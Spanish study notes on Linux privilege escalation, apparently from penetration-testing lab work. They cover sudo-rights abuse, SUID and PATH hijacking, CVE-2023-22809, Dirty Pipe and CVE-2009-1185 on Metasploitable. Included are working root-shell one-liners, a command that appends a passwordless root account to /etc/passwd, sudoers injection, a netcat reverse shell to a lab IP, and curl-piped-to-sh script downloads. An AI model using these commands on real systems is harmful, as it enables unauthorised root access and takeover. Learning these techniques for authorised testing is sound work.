
---

## Explotación Sudo Rights

La vulnerabilidad tiene que ver con una delegación excesiva de permisos. Esos permisos los podemos encontrar en `/etc/sudoers`. Cuando se ejecuta `sudo`, el sistema verifica si el usuario tiene permisos explícitos en ese archivo.

Para consultar diferentes tipos de escalada de privilegios se puede utilizar esta herramienta [GTFObins](https://gtfobins.org/)

### Forma de uso:

```
sudo -l
```

Nos mostrará la lista los comandos permitidos para el usuario actual.

![[Pasted image 20260214185611.png]]

### Ejemplos

- ***less***
![[Pasted image 20260214185746.png]]
![[Pasted image 20260214185800.png]]

- ***ftp***
![[Pasted image 20260214185946.png]]

- ***man***
![[Pasted image 20260214190050.png]]
![[Pasted image 20260214190112.png]]

- ***vi***
![[Pasted image 20260214190259.png]]
![[Pasted image 20260214190246.png]]

- ***apt-get***

```
sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash"
```

- ***awk***

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

- ***find***

```
sudo find . -exec /bin/bash -p \; -quit
```

- ***ed***

```
sudo ed

!/bin/bash
```

- ***pico/nano***

```
sudo nano -s /bin/sh
/bin/sh
^T^T
```

- ***tee***

```
echo "root2::0:0:root:/root:/bin/bash" | sudo /usr/bin/tee -a /etc/passwd

sudo root2
```

---

## Permisos especiales en Linux: SUID, SGID y Sticky Bit

**SUID**: El bit SUID permite que un archivo ejecutable corra con los privilegios del *propietario del archivo*, no del usuario que lanza el comando.

**SGID**: Ejecuta el binario con los permisos del grupo propietario (similar al SUID pero con los **grupos**).

**Sticky Bit**: Diseñado para directorios con permisos de escritura total (777). Evita que un usuario borre o renombre los archivos de otro usuario, aunque tenga permiso de escritura en la carpeta.

### Ejemplos con ejecutables configurados con SUID y manipulando la variable *PATH* 

![[Pasted image 20260214193658.png]]

![[Pasted image 20260214193728.png]]

![[Pasted image 20260214193846.png]]

*Explicación*:

El ejecutable utiliza el comando `more` que usualmente se ubica en alguna de las carpetas de binarios del sistema que podemos encontrar en la variable *$PATH*. 

La variable $PATH suele tener un valor parecido al siguiente:

```
/usr/local/bin:/usr/bin:/bin
```

Para escalar privilegios crearemos un archivo que abra una shell con el usuario que ejecuta el script. 

Además le añadiremos al principio de la variable *$PATH* el `/tmp`:

```
export PATH=/tmp:$PATH
```

En resumidas cuentas, cuando se ejecute el script y quiera ejecutar el comando se dirigirá primero al que tiene en la variable $PATH (el del tmp) y ejecutará el script malicioso para cambiar el usuario de la shell.

---

## Vulnerabilidad **CVE-2023-22809**

Esta vulnerabilidad permite a un usuario con permisos limitados elevar sus privilegios hasta obtener una sesión como *root*. El fallo reside en cómo sudo maneja las variables de entorno al editar archivos.

- La versión vulnerable debe estar entre 1.8.0 y 1.9.12p1. 
- El usuario actual debe tener permiso en /etc/sudoers para ejecutar `sudoedit` o `sudo -e`.

### Preparación del entorno

#### Reconocimiento

Averiguar la versión de sudo que se está utilizando en el equipo:

```
sudo --version
```

#### Preparación de la carga útil (Payload).

```
export EDITOR="nano -- /etc/sudoers"
```

El entorno EDITOR se manipula para inyectar parámetros adicionales a la herramienta legítima `nano`.

#### Ejecución e Inyección

```
sudoedit /ruta/a/archivo.txt
```

El resultado ignora archivo.txt y abre el `/etc/sudoers` con permisos de escritura.

Una vez dentro modificamos el fichero añadiendo una política que otorga permisos totales al usuario.

```
prueba ALL=(ALL:ALL) NOPASSWD: ALL
```

El usuario `prueba` podrá ejecutar cualquier comando como cualquier usuario sin contraseña.

Al salir del fichero ejecutamos:

```
sudo su
```

Y automáticamente seremos el usuario `root`.

---

## Vulnerabilidad CVE-2022-0847 (Dirty Pipe)

Esta vulnerabilidad crítica permite a un usuario local no autorizado inyectar datos en archivos de solo lectura, escalando privilegios hasta obtener una sesión **root**.

Requisitos:

- Versión del kernel -> **5.8 - 5.16.11**
- Binarios SUID -> Debe existir un ejecutable propiedad de root con el bit SUID
```
-rwsr-xr-x
```

#### Reconocimiento

```
find / -perm -u=s 2> /dev/null
```

Identificamos los binarios con permisos elevados que nos servirán para el vector de ataque.

#### Armamento (Búsqueda del Exploit)

En nuestra máquina Kali nos preparamos para el exploit:

```
searchsploit linux kernel 5. dirtypipe

searchsploit -m 50808.c
```

Lo movemos a la carpeta `/var/www/html` y desde la máquina víctima descargamos el fichero con un `wget`.

Compilamos el script:

```
gcc 50808.c -o dirty-pipe

./dirty-pipe /usr/bin/chfn
```

Una vez ejecutado esto acabaremos siendo `root`.

---

## Vulnerabilidad CVE-2009-1185

Estudiaremos la vulnerabilidad en la maquina Metasploitable.
#### Reconocimiento

Identificamos el puerto no convencional vulnerable y descubrimos que es una puerta trasera directa al sistema.

Hacemos una conexión con [[Netcat]]:

```
nc [IP] 1524
```

Aunque entremos como root cambiaremos al usuario **msfadmin** para explotar la vulnerabilidad. 

Le pasamos a la maquina a explotar el script linpeas.sh:

![[Pasted image 20260215104208.png]]

![[Pasted image 20260215104227.png]]

La salida del script revela una versión de kernel vulnerable.

#### Selección del exploit.

En la kali:

```
searchsploit linux kernel 2.6 dev
```

El exploit obtenido lo pasaremos a la máquina auditada.

Una vez transferidaopasaremos a compilarlo.

```
gcc exploit-udev.c -o exploit-udev
```

La mecánica del ataque es la siguiente:

1. El exploit ejecuta **/tmp/run**
2. Deja el ID del servicio Netlink (visible en **/proc/net/netlink**)
3. Sesión de Netcat en Kali

Mientras tanto en la kali ejecutaremos los siguientes comandos

```
echo "#!/bin/bash" > /tmp/run
echo "nc 192.168.254.42 7777 -e /bin/bash" >> /tmp/run
```

En la máquina auditada tendremos que observar el PID para pasárselo al ejecutable.

```
cat /proc/net/netlink
```

Tendremos que ver una salida de este estilo:

![[Pasted image 20260215105716.png]]

Le pasaremos ese PID como parámetro al ejecutar el script:

```
./exploit-udev 2367
```

Al capturar la shell inversa con la kali veremos que se ha establecido una shell con el usuario root.

---

## LinPeas

![[Pasted image 20260221171001.png]]

### ¿Qué es?

Es un script creado para enumerar todas las vías posibles para elevar privilegios.

### Script

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Les.sh

*Este script no está incluido en el LinPeas*

**Instalación:**

```
# Obtener script
wget https://raw.githubusercontent.com/zldang/les/master/les.sh

# Cambiamos las variables de entorno
nano les.sh 

# Añadimos permisos de ejecución
chmod +x les.sh

# Arrancamos el programa
./les.sh
```

Al arrancarlo deberemos ver una lista de vulnerabilidades que tiene el equipo.

